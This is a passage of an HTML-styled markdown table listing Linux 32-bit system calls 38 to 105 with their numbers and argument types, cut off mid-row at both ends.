| <font style=\"color:#4f4f4f;\">rename</font> | <font style=\"color:#4f4f4f;\">38.</font> | <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">39.</font> | <font style=\"color:#4f4f4f;\">mkdir</font> | <font style=\"color:#4f4f4f;\">39.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">40.</font> | <font style=\"color:#4f4f4f;\">rmdir</font> | <font style=\"color:#4f4f4f;\">40.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">41.</font> | <font style=\"color:#4f4f4f;\">dup</font> | <font style=\"color:#4f4f4f;\">41.</font> | <font style=\"color:#4f4f4f;\">unsigned int fildes</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">42.</font> | <font style=\"color:#4f4f4f;\">pipe</font> | <font style=\"color:#4f4f4f;\">42.</font> | <font style=\"color:#4f4f4f;\">int *fildes</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">43.</font> | <font style=\"color:#4f4f4f;\">times</font> | <font style=\"color:#4f4f4f;\">43.</font> | <font style=\"color:#4f4f4f;\">struct tms *tbuf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">44.</font> | <font style=\"color:#4f4f4f;\">prof</font> | <font style=\"color:#4f4f4f;\">44.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">45.</font> | <font style=\"color:#4f4f4f;\">brk</font> | <font style=\"color:#4f4f4f;\">45.</font> | <font style=\"color:#4f4f4f;\">unsigned long brk</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">46.</font> | <font style=\"color:#4f4f4f;\">setgid</font> | <font style=\"color:#4f4f4f;\">46.</font> | <font style=\"color:#4f4f4f;\">gid_t gid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">47.</font> | <font style=\"color:#4f4f4f;\">getgid</font> | <font style=\"color:#4f4f4f;\">47.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">48.</font> | <font style=\"color:#4f4f4f;\">signal</font> | <font style=\"color:#4f4f4f;\">48.</font> | <font style=\"color:#4f4f4f;\">int sig</font> | <font style=\"color:#4f4f4f;\">__sighandler_t handler</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">49.</font> | <font style=\"color:#4f4f4f;\">geteuid</font> | <font style=\"color:#4f4f4f;\">49.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">50.</font> | <font style=\"color:#4f4f4f;\">getegid</font> | <font style=\"color:#4f4f4f;\">50.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">51.</font> | <font style=\"color:#4f4f4f;\">acct</font> | <font style=\"color:#4f4f4f;\">51.</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">52.</font> | <font style=\"color:#4f4f4f;\">umount2</font> | <font style=\"color:#4f4f4f;\">52.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">53.</font> | <font style=\"color:#4f4f4f;\">lock</font> | <font style=\"color:#4f4f4f;\">53.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">54.</font> | <font style=\"color:#4f4f4f;\">ioctl</font> | <font style=\"color:#4f4f4f;\">54.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">unsigned long arg</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">55.</font> | <font style=\"color:#4f4f4f;\">fcntl</font> | <font style=\"color:#4f4f4f;\">55.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">unsigned long arg</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">56.</font> | <font style=\"color:#4f4f4f;\">mpx</font> | <font style=\"color:#4f4f4f;\">56.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">57.</font> | <font style=\"color:#4f4f4f;\">setpgid</font> | <font style=\"color:#4f4f4f;\">57.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">pid_t pgid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">58.</font> | <font style=\"color:#4f4f4f;\">ulimit</font> | <font style=\"color:#4f4f4f;\">58.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">59.</font> | <font style=\"color:#4f4f4f;\">oldolduname</font> | <font style=\"color:#4f4f4f;\">59.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">60.</font> | <font style=\"color:#4f4f4f;\">umask</font> | <font style=\"color:#4f4f4f;\">60.</font> | <font style=\"color:#4f4f4f;\">int mask</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">61.</font> | <font style=\"color:#4f4f4f;\">chroot</font> | <font style=\"color:#4f4f4f;\">61.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">62.</font> | <font style=\"color:#4f4f4f;\">ustat</font> | <font style=\"color:#4f4f4f;\">62.</font> | <font style=\"color:#4f4f4f;\">unsigned dev</font> | <font style=\"color:#4f4f4f;\">struct ustat *ubuf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">63.</font> | <font style=\"color:#4f4f4f;\">dup2</font> | <font style=\"color:#4f4f4f;\">63.</font> | <font style=\"color:#4f4f4f;\">unsigned int oldfd</font> | <font style=\"color:#4f4f4f;\">unsigned int newfd</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">64.</font> | <font style=\"color:#4f4f4f;\">getppid</font> | <font style=\"color:#4f4f4f;\">64.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">65.</font> | <font style=\"color:#4f4f4f;\">getpgrp</font> | <font style=\"color:#4f4f4f;\">65.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">66.</font> | <font style=\"color:#4f4f4f;\">setsid</font> | <font style=\"color:#4f4f4f;\">66.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">67.</font> | <font style=\"color:#4f4f4f;\">sigaction</font> | <font style=\"color:#4f4f4f;\">67.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">const struct old_sigaction *</font> | <font style=\"color:#4f4f4f;\">struct old_sigaction *</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">68.</font> | <font style=\"color:#4f4f4f;\">sgetmask</font> | <font style=\"color:#4f4f4f;\">68.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">69.</font> | <font style=\"color:#4f4f4f;\">ssetmask</font> | <font style=\"color:#4f4f4f;\">69.</font> | <font style=\"color:#4f4f4f;\">int newmask</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">70.</font> | <font style=\"color:#4f4f4f;\">setreuid</font> | <font style=\"color:#4f4f4f;\">70.</font> | <font style=\"color:#4f4f4f;\">uid_t ruid</font> | <font style=\"color:#4f4f4f;\">uid_t euid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">71.</font> | <font style=\"color:#4f4f4f;\">setregid</font> | <font style=\"color:#4f4f4f;\">71.</font> | <font style=\"color:#4f4f4f;\">gid_t rgid</font> | <font style=\"color:#4f4f4f;\">gid_t egid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">72.</font> | <font style=\"color:#4f4f4f;\">sigsuspend</font> | <font style=\"color:#4f4f4f;\">72.</font> | <font style=\"color:#4f4f4f;\">int unused1</font> | <font style=\"color:#4f4f4f;\">int unused2</font> | <font style=\"color:#4f4f4f;\">old_sigset_t mask</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">73.</font> | <font style=\"color:#4f4f4f;\">sigpending</font> | <font style=\"color:#4f4f4f;\">73.</font> | <font style=\"color:#4f4f4f;\">old_sigset_t *uset</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">74.</font> | <font style=\"color:#4f4f4f;\">sethostname</font> | <font style=\"color:#4f4f4f;\">74.</font> | <font style=\"color:#4f4f4f;\">char *name</font> | <font style=\"color:#4f4f4f;\">int len</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">75.</font> | <font style=\"color:#4f4f4f;\">setrlimit</font> | <font style=\"color:#4f4f4f;\">75.</font> | <font style=\"color:#4f4f4f;\">unsigned int resource</font> | <font style=\"color:#4f4f4f;\">struct rlimit *rlim</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">76.</font> | <font style=\"color:#4f4f4f;\">getrlimit</font> | <font style=\"color:#4f4f4f;\">76.</font> | <font style=\"color:#4f4f4f;\">unsigned int resource</font> | <font style=\"color:#4f4f4f;\">struct rlimit *rlim</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">77.</font> | <font style=\"color:#4f4f4f;\">getrusage</font> | <font style=\"color:#4f4f4f;\">77.</font> | <font style=\"color:#4f4f4f;\">int who</font> | <font style=\"color:#4f4f4f;\">struct rusage *ru</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">78.</font> | <font style=\"color:#4f4f4f;\">gettimeofday</font> | <font style=\"color:#4f4f4f;\">78.</font> | <font style=\"color:#4f4f4f;\">struct timeval *tv</font> | <font style=\"color:#4f4f4f;\">struct timezone *tz</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">79.</font> | <font style=\"color:#4f4f4f;\">settimeofday</font> | <font style=\"color:#4f4f4f;\">79.</font> | <font style=\"color:#4f4f4f;\">struct timeval *tv</font> | <font style=\"color:#4f4f4f;\">struct timezone *tz</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">80.</font> | <font style=\"color:#4f4f4f;\">getgroups</font> | <font style=\"color:#4f4f4f;\">80.</font> | <font style=\"color:#4f4f4f;\">int gidsetsize</font> | <font style=\"color:#4f4f4f;\">gid_t *grouplist</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">81.</font> | <font style=\"color:#4f4f4f;\">setgroups</font> | <font style=\"color:#4f4f4f;\">81.</font> | <font style=\"color:#4f4f4f;\">int gidsetsize</font> | <font style=\"color:#4f4f4f;\">gid_t *grouplist</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">82.</font> | <font style=\"color:#4f4f4f;\">select</font> | <font style=\"color:#4f4f4f;\">82.</font> | <font style=\"color:#4f4f4f;\">int n</font> | <font style=\"color:#4f4f4f;\">fd_set *inp</font> | <font style=\"color:#4f4f4f;\">fd_set *outp</font> | <font style=\"color:#4f4f4f;\">fd_set *exp</font> | <font style=\"color:#4f4f4f;\">struct timeval *tvp</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">83.</font> | <font style=\"color:#4f4f4f;\">symlink</font> | <font style=\"color:#4f4f4f;\">83.</font> | <font style=\"color:#4f4f4f;\">const char *old</font> | <font style=\"color:#4f4f4f;\">const char *new</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">84.</font> | <font style=\"color:#4f4f4f;\">oldlstat</font> | <font style=\"color:#4f4f4f;\">84.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">85.</font> | <font style=\"color:#4f4f4f;\">readlink</font> | <font style=\"color:#4f4f4f;\">85.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">int bufsiz</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">86.</font> | <font style=\"color:#4f4f4f;\">uselib</font> | <font style=\"color:#4f4f4f;\">86.</font> | <font style=\"color:#4f4f4f;\">const char *library</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">87.</font> | <font style=\"color:#4f4f4f;\">swapon</font> | <font style=\"color:#4f4f4f;\">87.</font> | <font style=\"color:#4f4f4f;\">const char *specialfile</font> | <font style=\"color:#4f4f4f;\">int swap_flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">88.</font> | <font style=\"color:#4f4f4f;\">reboot</font> | <font style=\"color:#4f4f4f;\">88.</font> | <font style=\"color:#4f4f4f;\">int magic1</font> | <font style=\"color:#4f4f4f;\">int magic2</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">void *arg</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">89.</font> | <font style=\"color:#4f4f4f;\">readdir</font> | <font style=\"color:#4f4f4f;\">89.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">90.</font> | <font style=\"color:#4f4f4f;\">mmap</font> | <font style=\"color:#4f4f4f;\">90.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">91.</font> | <font style=\"color:#4f4f4f;\">munmap</font> | <font style=\"color:#4f4f4f;\">91.</font> | <font style=\"color:#4f4f4f;\">unsigned long addr</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">92.</font> | <font style=\"color:#4f4f4f;\">truncate</font> | <font style=\"color:#4f4f4f;\">92.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">long length</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">93.</font> | <font style=\"color:#4f4f4f;\">ftruncate</font> | <font style=\"color:#4f4f4f;\">93.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">unsigned long length</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">94.</font> | <font style=\"color:#4f4f4f;\">fchmod</font> | <font style=\"color:#4f4f4f;\">94.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">95.</font> | <font style=\"color:#4f4f4f;\">fchown</font> | <font style=\"color:#4f4f4f;\">95.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">uid_t user</font> | <font style=\"color:#4f4f4f;\">gid_t group</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">96.</font> | <font style=\"color:#4f4f4f;\">getpriority</font> | <font style=\"color:#4f4f4f;\">96.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">int who</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">97.</font> | <font style=\"color:#4f4f4f;\">setpriority</font> | <font style=\"color:#4f4f4f;\">97.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">int who</font> | <font style=\"color:#4f4f4f;\">int niceval</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">98.</font> | <font style=\"color:#4f4f4f;\">profil</font> | <font style=\"color:#4f4f4f;\">98.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">99.</font> | <font style=\"color:#4f4f4f;\">statfs</font> | <font style=\"color:#4f4f4f;\">99.</font> | <font style=\"color:#4f4f4f;\">const char * path</font> | <font style=\"color:#4f4f4f;\">struct statfs *buf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">100.</font> | <font style=\"color:#4f4f4f;\">fstatfs</font> | <font style=\"color:#4f4f4f;\">100.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">struct statfs *buf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">101.</font> | <font style=\"color:#4f4f4f;\">ioperm</font> | <font style=\"color:#4f4f4f;\">101.</font> | <font style=\"color:#4f4f4f;\">unsigned long from</font> | <font style=\"color:#4f4f4f;\">unsigned long num</font> | <font style=\"color:#4f4f4f;\">int on</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">102.</font> | <font style=\"color:#4f4f4f;\">socketcall</font> | <font style=\"color:#4f4f4f;\">102.</font> | <font style=\"color:#4f4f4f;\">int call</font> | <font style=\"color:#4f4f4f;\">unsigned long *args</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">103.</font> | <font style=\"color:#4f4f4f;\">syslog</font> | <font style=\"color:#4f4f4f;\">103.</font> | <font style=\"color:#4f4f4f;\">int type</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">int len</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">104.</font> | <font style=\"color:#4f4f4f;\">setitimer</font> | <font style=\"color:#4f4f4f;\">104.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">struct itimerval *value</font> | <font style=\"color:#4f4f4f;\">struct itimerval *ovalue</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">105.</font> | <font style=\"color:#4f4f4f;\">getitimer</font> | <font style=\"color:#4f4f4f;\">105.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">struct itimerval *value</font> | <font 